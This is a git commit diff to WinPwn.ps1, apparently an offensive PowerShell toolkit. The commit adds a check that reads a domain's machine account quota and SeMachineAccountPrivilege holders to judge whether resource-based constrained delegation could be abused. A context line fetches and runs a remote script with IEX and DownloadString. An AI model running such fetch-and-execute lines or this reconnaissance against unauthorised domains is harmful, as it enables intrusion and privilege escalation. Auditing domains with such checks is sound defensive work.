a8efb44d7d662d542521d60b30c77f1f400cc68c
S3cur3Th1sSh1t <S3cur3Th1sSh1t@github.com>
2022-07-03 20:25:43 +0200

    RBCD Checks via @LuemmelSec's script

--- WinPwn.ps1
+++ WinPwn.ps1
@@ -2547,7 +2547,68 @@ function generaldomaininfo{
     if(!$consoleoutput){breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt"}else{Write-Host -ForegroundColor Yellow "------->  DomainPrinters";breviaries -Printers} 	        
   IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SPN-Scan.ps1')
   if(!$consoleoutput){Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"}else{Write-Host -ForegroundColor Yellow "------->  InterestingSPNs";Discover-PSInterestingServices}
-    
+  
+
+  # Simple Script to check if RBCD could potentially be abused.
+# For that we check the ms-DS-MachineAccountQuota value which determines how many computer objects can be added.
+# We also check who can add computer accounts to the domain by querying the Default Domain Controllers Policy for the SeMachineAccountPrivilege attribute.
+# This is not failsafe, especially the latter part.
+# If run from a non domain joined system run it using runas:
+# runas /netonly /user:DOMAIN.FQDN\USER.NAME powershell
+
+# Proudly brought to you by @LuemmelSec
+
+# If in Domain context we can also just use AD PS cmdlets to query for the quota:
+# Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
+
+$mySearcher = New-Object System.DirectoryServices.DirectorySearcher
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+ 
+# it is possible to specify manually a ldap search Path and provide credentials instead:
+#$mySearcher.SearchRoot = "LDAP://DC=DOMAIN,DC=LOCAL",”USERNAME”,”PASSWORD”)
+ 
+$mySearcher.SearchRoot = $objDomain
+ 
+# search for object class "domain"
+$mySearcher.Filter = "(& (objectClass=domain))"
+$mySearcher.SearchScope = "sub"
+ 
+# specifiy the attributes you would like to retrieve
+$myAttributes = ("name", "ms-DS-MachineAccountQuota")
+$mySearcher.PropertiesToLoad.AddRange($myAttributes)
+ 
+$searchresult = $mySearcher.FindAll()
+foreach ($i in $searchresult.Properties.PropertyNames){
+    if($i -eq "ms-ds-machineaccountquota"){
+    $MAQ= $searchresult.Properties.$i
+    }
+}
+
+[xml]$GPOXML= Get-GPOReport -Name "Default Domain Controllers Policy" -ReportType Xml
+foreach ($p in $GpoXml.GPO.Computer.ExtensionData.Extension.UserRightsAssignment) {
+    if($p.name -eq "SeMachineAccountPrivilege"){
+    $SeMachineAccountPrivilege = $p.InnerText
+    }
+}
+
+if(($MAQ -gt 0) -and ($SeMachineAccountPrivilege -match "Authenti")){
+    if($consoleoutput){
+        Write-Host "### RBCD abusable ### " -ForegroundColor Green
+        Write-Host "Users / Groups: $($SeMachineAccountPrivilege -Split("SeMachineAccountPrivilege"))"
+        Write-Host "Quota: $($MAQ)"
+        }
+        else
+        {Write-Host "### RBCD abusable ###, Computer Account Creation is allowed for Authenticated Users " >> "$currentPath\Vulnerabilities\RBCD_Possible.txt"}
+    }
+
+if(($MAQ -lt 1) -or ($SeMachineAccountPrivilege -notmatch "Authenti")){
+    if($consoleoutput){
+        Write-Host "### RBCD NOT abusable ### " -ForegroundColor Red
+        Write-Host "Users / Groups: $($SeMachineAccountPrivilege -Split("SeMachineAccountPrivilege"))"
+        Write-Host "Quota: $($MAQ)"
+        }
+        else{}
+    }
 	    
     if(!$consoleoutput){Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPasswordPolicy.txt"}else{Write-Host -ForegroundColor Yellow '------->  Users without password policy:';Get-ADUser -Filter {UserAccountControl -band 0x0020}}
 
